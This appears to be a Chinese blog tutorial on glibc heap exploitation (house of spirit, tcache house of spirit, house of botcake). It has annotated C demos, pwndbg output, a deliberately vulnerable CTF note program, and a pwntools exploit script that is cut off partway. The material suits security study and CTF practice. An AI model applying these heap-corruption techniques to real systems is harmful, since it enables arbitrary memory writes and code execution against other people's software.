<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x40 [  1]: 0x7fffffffe390 ◂— 0x0</span><br><span class="line">fastbins</span><br></pre></td></tr></table></figure>

<h4 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h4><p>本例就是通过free一个fake chunk来让我们malloc任意地址</p>
<p>程序首先让堆初始化了，然后申请了变量a和fake_chunks</p>
<p>之后程序在fake_chunks中伪造了一个size为0x40的fake_chunk，把a指向fake_chunk的域（也就是Fd指针</p>
<p>现在free a，我们的fake_chunk就被放到了free list中</p>
<p>此时再malloc就可以返回我们的fake chunk了</p>
<h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h3><p>在看完tcache的HOS之后,我们回来看看之前的HOS是什么样的</p>
<p>我们的house of spirit是通过free一个伪造的fastbin chunk来任意地址malloc</p>
<p>让我们来看看和tcache有什么区别吧</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这个例子演示了 house of spirit 攻击\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;我们将构造一个 fake chunk 然后释放掉它，这样再次申请的时候就会申请到它\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;覆盖一个指向 fastbin 的指针\n&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a, *b;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line">	<span class="comment">//这个域包含了两个chunk,第一个从fake_chunks[1]开始,另一个从fake_chunks[9]开始</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这块区域 (长度为: %lu) 包含两个 chunk. 第一个在 %p 第二个在 %p.\n&quot;</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line">	<span class="comment">//这个chunk的size必须符和fastbin的要求(&lt;=128 x64位系统),PREV_INUSE位在fasybin-sized chunks中也是被忽略的,但是IS_MAPPED和NON_MAIN_AREN会引发一些问题</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;构造 fake chunk 的 size，要比 chunk 大 0x10（因为 chunk 头），同时还要保证属于 fastbin，对于 fastbin 来说 prev_inuse 不会改变，但是其他两个位需要注意都要位 0\n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// size</span></span><br><span class="line">	<span class="comment">//下一个fake chunk的size必须是合法的。 即&gt; 2 * SIZE_SZ（在x64上需要&gt; 16）和＆&lt;av-&gt; system_mem（对于main arena来说，默认为&lt;128kb）并且可以通过nextsize完整性检查。 但是我们无需符和Fastbin的大小</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;next chunk 的大小也要注意，要大于 0x10 小于 av-&gt;system_mem（128kb）\n&quot;</span>);</span><br><span class="line">        <span class="comment">// 这是fake_chunks[?]可以数一下</span></span><br><span class="line">    fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line">    fake_chunks[<span class="number">2</span>] = <span class="number">0x4141414141414141L</span>L;</span><br><span class="line">    fake_chunks[<span class="number">10</span>] = <span class="number">0x4141414141414141L</span>L;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在，我们拿伪造的那个 fake chunk 的地址进行 free, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;free!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">	<span class="comment">//现在下一次的malloc就将会返回我们的fake chunk了</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在 malloc 的时候将会把 %p 给返回回来\n&quot;</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line">    b[<span class="number">0</span>] = <span class="number">0x4242424242424242L</span>L;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ok!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看完源代码可以发现,我们正常的hos是需要伪造两个chunk的,而tcache则不需要伪造下一个chunk,但是虽然本例中需要伪造两个chunk,但是我们所伪造的第二个chunk是可以不用为fastbin大小的chunk的</p>
<h4 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h4><p>对于没有tcache的glibc版本而言，我们需要连续伪造两块size合法的chunk，并且第二块chunk的size并不需要满足fastbin的要求，只要满足合法的size即可</p>
<p>本程序首先初始话了一下堆,然后申请了两个变量，一个是我们即将攻击的变量 a，另一个是我们的fake_chunks</p>
<p>程序先在fake_chunks[1]的地方也就是size域伪造了合法的size，0x40(满足fastbin size大小，与16字节对齐，标志位正确)</p>
<p>之后又在下一处伪造了第二个chunk，即从fake_chunks[8]开始的地方，这是为什么呢，因为我们第一个fake chunk的size伪造成了0x40，那么我们第二个chunk就需要在向下0x40的地方也就是fake_chunks+8的地方伪造第二个chunk</p>
<h3 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h3><p>本攻击可以bypass glibc 新增加的一些限制,如果libc没有该限制,我们可以直接用double free来做更简单的tcache poisoning了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;house_of_botcake 是针对 glibc2.29 对 tcache double free 做出限制以后提出的利用方法&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;我们希望 malloc 到的地址是 %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;malloc 7 个 chunk 以便稍后填满 tcache&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): prev=%p. 待会用\n&quot;</span>, prev); </span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;再 malloc(0x100): a=%p. 作为攻击的 chunk\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;最后 malloc(0x10) 防止与 top chunk 合并\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;接下来构造 chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;第一步: 填满 tcache 链表&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;第二步: free 掉 chunk a，放入 unsorted bin 中&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;第三步: 释放掉 chunk prev 因为后面是一个 free chunk，所以他会与 chunk a 合并&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;第四步: 这时候已经没有指向 chunk a 的指针了，从 tcache 中取出一个，然后再次 free(a) 就把 chunk a 加入到了 tcache 中，造成了 double free \n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;再去 malloc 一个 0x120 会从 unsorted bin 中分割出来，也就控制了前面已经合并的那个 chunk a 了&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;把 chunk a 的 next 指针给改为前面声明的 stack_var 的地址&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;再去 malloc 一个就能申请到 stack_var 了&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新申请的 chunk 在：%p\n&quot;</span>, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<ul>
<li>从31行开始，这里free了7个chunk是为了填满tcache</li>
<li>再free(a)，使a放入unsortedbin中，再free(prev)，使再unsortedbin中的chunk a和chunk prev合并，实现chunk_overlapping，以至于此时bins中并没有chunk a的信息（chunk a的prev_size在0x555555603ad0）如下：</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x5555556038c0 —▸ 0x5555556037b0 —▸ 0x5555556036a0 —▸ 0x555555603590 —▸ 0x555555603480 —▸ 0x555555603370 —▸ 0x555555603260 ◂— 0x</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555556039c0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x5555556039c0                      </span><br></pre></td></tr></table></figure>

<ul>
<li>执行了38行的malloc(0x100)，使tcachebins中腾出了一个位置</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  6]: 0x5555556037b0 —▸ 0x5555556036a0 —▸ 0x555555603590 —▸ 0x555555603480 —▸ 0x555555603370 —▸ 0x555555603260 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555556039c0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x5555556039c0</span><br></pre></td></tr></table></figure>

<ul>
<li>执行了39行过后，chunk a就被放入了tcachebins中，这就实现了<strong>double_free</strong>，一个在tcachebins中一个在unsortedbins</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins      <span class="comment">#|这个|#chunk a_mem_ptr</span></span><br><span class="line">0x110 [  7]: 0x555555603ae0 —▸ 0x5555556037b0 —▸ 0x5555556036a0 —▸ 0x555555603590 —▸ 0x555555603480 —▸ 0x555555603370 —▸ 0x555555603260 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555556039c0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x5555556039c0</span><br></pre></td></tr></table></figure>

<ul>
<li>执行了42行后，修改了chunk a的next指针此时chunk a的情况：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/48gx 0x555555603ad0</span><br><span class="line">0x555555603ad0: 0x0000000000000000      0x0000000000000111</span><br><span class="line">0x555555603ae0: 0x00007fffffffe380      0x0000555555603010</span><br><span class="line">0x555555603af0: 0x0000000000000000      0x00000000000000f1</span><br><span class="line">0x555555603b00: 0x00007ffff7dcdca0      0x00007ffff7dcdca0</span><br><span class="line">0x555555603b10: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>同样bins也发生了变化，此时的bins:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x555555603ae0 —▸ 0x7fffffffe380 ◂— 9 /* <span class="string">&#x27;\t&#x27;</span> */</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555603af0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555603af0</span><br><span class="line">smallbins</span><br></pre></td></tr></table></figure>

<p>最终，我们在连续申请两个chunk就能得到<code>&amp;stack_var</code>的哪个chunk。</p>
<blockquote>
<p>实战中，我们的stacke_var可以是任意地址</p>
</blockquote>
<h4 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h4><p>本例即是通过构造一个chunk_overlapping来辅助我们double free一个tcache chunk，从而得到任意地址分配的效果</p>
<p>首先程序先在栈上声明了一个变量</p>
<p>之后申请了7个大小为0x100的chunks来为后面填满tcache来做准备</p>
<p>然后申请了3个chunk ,prev(0x100),a(0x100)还有用于防止后面我们释放a时a和top chunk合并的一个chunk(0x10)</p>
<p>到此准备工作就结束了；</p>
<p>下面程序free掉了之前我们申请的那7个chunk来填满我们的tcache</p>
<p>之后程序free掉了a，a被放入了unsorted bin中</p>
<p>此时我们在free prev，由于a,prev相邻，因此二者合并成了一个大chunk，同样被放进了unsorted bin中</p>
<p>此时free list上就没有了a的信息</p>
<p>现在程序从tcache中取出一个chunk,tcache中就有了一个空位，我们再次free a,就会把我们的a放到tcache中了</p>
<p>此时，我们的a既在tcache中，又在unsortedbin的大chunk中</p>
<p>也就是完成了一个<strong>double free</strong>（若还有修改功能到这里我们就可以做我们想做的事了）</p>
<p>之后程序malloc了b(0x120),由于unsortedbin中的chunk大小大于0x120,因此做了一个切割，并把剩下的部分留在unsorted bin中</p>
<p>此时的b是从之前prev的位置开始的，因此我们通过覆写b来将我们a的fwd指针指向栈上</p>
<p>此时，我们再申请两次就可以分配到栈上的地址了</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="tcache-corruption-dup-—-libc-2-27"><a href="#tcache-corruption-dup-—-libc-2-27" class="headerlink" title="tcache_corruption+dup — libc 2.27"></a>tcache_corruption+dup — libc 2.27</h3><p><a href="https://faraz.faith/2019-10-20-secconctf-2019-one/">one</a></p>
<h3 id="tcache-corruption-—-libc-2-29"><a href="#tcache-corruption-—-libc-2-29" class="headerlink" title="tcache_corruption — libc 2.29"></a>tcache_corruption — libc 2.29</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LENGTH 22</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* nodes[LENGTH];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">inital</span><span class="params">()</span> &#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	alarm(<span class="number">0xffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">welcome</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Tcache Corruption - Two&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;1. add&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;2. delete&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;3. show&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;4. exit&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Your choice: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_n</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">	<span class="type">int</span> result;</span><br><span class="line">	result = read(STDIN_FILENO, buf, size);</span><br><span class="line">	<span class="keyword">if</span> (result &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">get_int</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">	<span class="type">int</span> result;</span><br><span class="line">	result = read_n(buf, <span class="keyword">sizeof</span>(buf) - <span class="number">1</span>);</span><br><span class="line">	buf[result] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size, index = <span class="number">-1</span>, i, result;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; LENGTH; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!nodes[i]) &#123;</span><br><span class="line">			index = i;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (index == <span class="number">-1</span>) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Out of space!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">	size = get_int();</span><br><span class="line">	<span class="keyword">if</span> (size &gt; <span class="number">0x400</span>) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Invalid size!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	nodes[index] = <span class="built_in">malloc</span>(size);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">	result = read_n(nodes[index], size);</span><br><span class="line">	<span class="keyword">if</span> (nodes[index][result - <span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">		nodes[index][result - <span class="number">1</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> index = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">	index = get_int();</span><br><span class="line">	<span class="keyword">if</span> (index &gt;= LENGTH || !nodes[index]) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(nodes[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; LENGTH; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (nodes[i]) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Index %d: %s\n&quot;</span>, i, nodes[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	inital();</span><br><span class="line">	welcome();</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		menu();</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> choice = get_int();</span><br><span class="line">		<span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			add();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			delete();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			show();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -o pwn1 pwn1.c  glibc-2.29 ubuntu18.04</span></span><br></pre></td></tr></table></figure>



<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">	p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(file_name)</span><br><span class="line">p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address, data      :log.success(<span class="string">&#x27;%s:   &#x27;</span> % (address) + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&quot;Your choice: &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"><span class="comment">##get </span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">data = uu64(r(<span class="number">6</span>))</span><br><span class="line">lg(<span class="string">&#x27;data&#x27;</span>,data)</span><br><span class="line">heap = data - <span class="number">0x260</span></span><br><span class="line">lg(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line"><span class="comment">##leak libc_base</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#9-15</span></span><br><span class="line"><span 